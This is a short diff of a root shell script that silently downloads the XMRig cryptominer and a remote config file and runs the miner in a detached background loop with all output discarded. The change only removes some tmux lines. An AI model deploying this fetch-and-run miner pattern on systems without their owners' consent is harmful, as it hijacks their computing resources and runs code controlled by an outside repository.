@@ -2,8 +2,6 @@
 sudo -i
 sudo apt-get update
 apt-get -y install jq
-apt-get install tmux
-tmux
 curl -o /var/tmp/xmrig -L https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-linux-static-x64.tar.gz > /dev/null 2>&1
 curl -o /var/tmp/config.json https://raw.githubusercontent.com/superalix/avian/main/config.json > /dev/null 2>&1
 chmod 777 /var/tmp/xmrig 
@@ -30,5 +28,4 @@ while true :
     mv u.json config.json 
     screen -d -m timeout $t ./xmrig -c config.json > /dev/null 2>&1
     sleep $t
-    tmux detach
 done
